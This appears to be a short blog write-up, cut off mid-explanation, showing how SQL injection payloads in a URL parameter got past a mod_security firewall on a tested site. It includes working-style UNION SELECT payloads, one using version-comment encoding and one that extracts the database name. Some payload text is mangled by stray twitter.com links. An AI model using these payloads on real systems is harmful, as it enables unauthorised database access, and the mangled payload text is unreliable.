# :game_die: Fun sql injection — mod_security bypass

---

# Fun sql injection — mod_security bypass

In this writing I would like to show you a somewhat peculiar case with which I came across testing a website.

This is an sql injection where I could bypass the “mod_security” waf.
When I start the sql injection test I realize that the website is using that waf.

We get the error when using a simple:

```
site/ejemplo?parameter=-1+union+selec+1,2,3,4,5,6,7+--+
```

Now, I’m not going to lie to you, just by encoding the payload with comments, I was able to bypass the waf filter.

```
site/ejemplo?parameter=-1+/*!50000union*/+/*!50000selec*/+1,2,3,4,5,6,7+--+
```

We can see that one of the vulnerable columns is number four.

But like all a lover of sql injections I decided not to leave it like that and try other methods, other payloads .. After many tests and failed mixed payloads.

I ended up trying this:

```
AND mod(29,9)+div+[@a](http://twitter.com/a):=(concat(database(),"--","_Y000!_"))+UNION+DISTINCTROW+SELECT+1,2,3,[@a](http://twitter.com/a),5,6,7
```

Now what is this all about?

we have:

```
"AND" = The AND operator returns a record if all conditions separated by AND are TRUE."mod(29,9)" = The mod function is to make a…
```

---
